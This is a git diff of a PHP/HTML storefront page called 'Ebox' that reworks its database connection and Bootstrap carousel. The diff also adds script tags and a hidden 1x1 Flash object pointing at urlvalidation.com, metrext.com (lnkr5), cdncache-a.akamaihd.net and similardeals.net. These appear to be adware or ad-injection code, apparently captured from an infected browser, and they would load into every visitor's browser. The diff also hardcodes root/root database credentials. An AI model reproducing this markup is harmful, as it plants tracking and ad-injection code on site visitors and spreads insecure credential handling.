@@ -1,12 +1,20 @@
 <?php
 
-require_once('connect.php');
+try {
+    $dbh = new PDO('mysql:host=localhost;dbname=subscriptdb','root','root');
+}
+
+catch(Exception $e) {
+
+    echo "hello";
+}
 
 ?>
+
+
 <!DOCTYPE html>
 
-<html>
-<head>
+<html><head><script type="text/javascript" async="" src="http://urlvalidation.com/whoami?jsonp=func67507"></script>
     <title>Ebox</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -17,8 +25,15 @@ require_once('connect.php');
     <script src="https://code.jquery.com/jquery-2.2.2.min.js" integrity="sha256-36cp2Co+/62rEAAYHLmRCPIych47CvdM+uTBJwSzWjI=" crossorigin="anonymous"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.css" rel="stylesheet">
     <link href="//cdnjs.cloudflare.com/ajax/libs/normalize/3.0.2/normalize.min.css" rel="stylesheet">
-    <link href='http://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
-   
+    <link href="http://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css">
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>   
     <script>
         $(document).ready(function(){
             $(".button a").click(function(){
@@ -33,9 +48,9 @@ require_once('connect.php');
         });
     </script>
     <link rel="stylesheet" type="text/css" href="style.css">
-</head>
+<link rel="stylesheet" href="//code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css"><link href="https://fonts.googleapis.com/css?family=Hammersmith+One" rel="stylesheet" type="text/css"></head>
 
-<body style="background-color: #34B484;">
+<body style="background-color: #2E2E2E"><div id="Vsx6uueXE15e" style="position: absolute; top: 0px; left: 0px; width: 1px; height: 1px; z-index: 2147483647;"><object type="application/x-shockwave-flash" id="_GPL_e6a00_swf" data="http://cdncache-a.akamaihd.net/items/e6a00/storage.swf?r=1" width="1" height="1"><param name="wmode" value="transparent"><param name="allowscriptaccess" value="always"><param name="flashvars" value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl"></object></div>
     
     <!--nav bar-->
 <nav style="background-color: #fff;">
@@ -52,7 +67,7 @@ require_once('connect.php');
         <a class="btn-open" href="#"></a>
     </div>
 </nav>
-<div class="overlay">
+<div class="overlay" style="display: none;">
     <div class="wrap">
         <ul class="wrap-nav">
             <li><a href="#">About</a>
@@ -94,72 +109,59 @@ require_once('connect.php');
                     </div>
                 </a>
             </div>
-    </div>
+    </ul></div>
 </div>
     <!--nav bar-->
 
-    
-    
-<div id="myCarousel" class="carousel slide" data-ride="carousel">
-    <!-- Indicators -->
-    <ol class="carousel-indicators">
-        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
-        <li data-target="#myCarousel" data-slide-to="1"></li>
-        <li data-target="#myCarousel" data-slide-to="2"></li>
-        <li data-target="#myCarousel" data-slide-to="3"></li>
-        <li data-target="#myCarousel" data-slide-to="4"></li>
-    </ol>
- 
-    <!-- Wrapper for slides -->
-    <div class="carousel-inner" role="listbox" style="background-color: #373B43;">
-        <div class="item active">
-            <img src="http://download.intel.com/newsroom/kits/idf/2013_fall/gallery/images/IvyTown_Package.jpg" alt="Image" style="height: 450px;width: 450px; ">
-            <div class="carousel-caption">
-                <h3 style="color: red;">Fix Carousel</h3>
-                <p>30M cache, 2.70GHz, 12 cores</p>
-            </div>
-        </div>
+    <div id="myCarousel" class="carousel slide" data-ride="carousel">
+  <!-- Indicators -->
+  <ol class="carousel-indicators">
+    <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+    <li data-target="#myCarousel" data-slide-to="1"></li>
+    <li data-target="#myCarousel" data-slide-to="2"></li>
+  </ol>
 
-        <div class="item">
-            <img src="http://i5.walmartimages.com/dfw/dce07b8c-63b5/k2-_8730fd38-d96f-4472-8173-315662688900.v1.jpg" alt="Image" style="height: 450px;width: 450px;">
-            <div class="carousel-caption">
-                <h3>Fitbit Flex Wireless Wristband</h3>
-                <p> Count the steps taken everyday.</p>
-            </div>
-        </div>
-        <div class="item">
-            <img src="images\iPhone-Family_US-EN-PRINT.png" alt="Image" style="height: 450px;width: 450px;">
-            <div class="carousel-caption">
-                <h3>iPhone</h3>
-                <p>The iPhone Family</p>
-            </div>
-        </div>
-        <div class="item">
-            <img src="images\iPadPro10-Lineup_PR-PRINT.png" alt="Image" style="height: 450px;width: 450px;">
-            <div class="carousel-caption">
-                <h3>iPad</h3>
-                <p>The iPad Family</p>
-            </div>
-        </div>
-        <div class="item">
-            <img src="images\Watch_Complications_Hero-PRINT.png" alt="Image" style="height: 450px;width: 450px;">
-            <div class="carousel-caption">
-                <h3>The Apple Watch</h3>
-                <p>The Most Personal Apple Device</p>
-            </div>
-        </div>
+  <!-- Wrapper for slides -->
+  <div class="carousel-inner" role="listbox" >
+    <div class="item active">
+      <img src="https://gotgame.com/wp-content/uploads/2013/01/Tegra4-ChipShotLowResolution-1024x683.jpg" style="height: 75%">
+      <div class="carousel-caption">
+        <h3></h3>
+        <p></p>
+      </div> 
     </div>
 
-    <!-- Left and right controls -->
-    <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
-        <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
-        <span class="sr-only">Previous</span>
-    </a>
-    <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
-        <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
-        <span class="sr-only">Next</span>
-    </a>
+    <div class="item">
+      <img src="http://www.hardwareluxx.de/images/stories/galleries/reviews/2015/geforce-titanx/geforce-titanx-fazit-2.jpg" style="height: 75%">
+      <div class="carousel-caption">
+        <h3></h3>
+        <p></p>
+      </div> 
+    </div>
+
+    <div class="item">
+      <img src="http://images.monoprice.com/productlargeimages/137885.jpg" style=" height: 75%">
+      <div class="carousel-caption" >
+        <h3></h3>
+        <p></p>
+      </div> 
+    </div>
+  </div>
+
+  <!-- Left and right controls -->
+  <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
+    <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+    <span class="sr-only">Previous</span>
+  </a>
+  <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
+    <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+    <span class="sr-only">Next</span>
+  </a>
 </div>
+    
+
+
+  
 
 <div class="container text-center">
     <h3 style="color: red;">Picture here with the green hue on top</h3><br>
@@ -179,5 +181,6 @@ require_once('connect.php');
     <p style="color: white;">Footer Text</p>
 </footer>
 
-</body>
-</html>
+
+
+<script type="text/javascript" async="" src="//metrext.com/1116d96cbc90cae357.js"></script><script type="text/javascript" src="http://metrext.com/addons/lnkr5.min.js"></script><script type="text/javascript" src="http://cdncache-a.akamaihd.net/sub/nee5452/49406_273_/l.js?pid=2448&amp;ext=Advetiser"></script><script type="text/javascript" src="http://rules.similardeals.net/v1.0/whitelist/1108/49406x273x/localhost?partnerName=Advetiser&amp;partnerLink=http%253A%252F%252Fthisadsfor.us%252Foptout%253Ft%253D273%2526u%253D49406%2526block%253Dlnkr_google"></script></body></html>
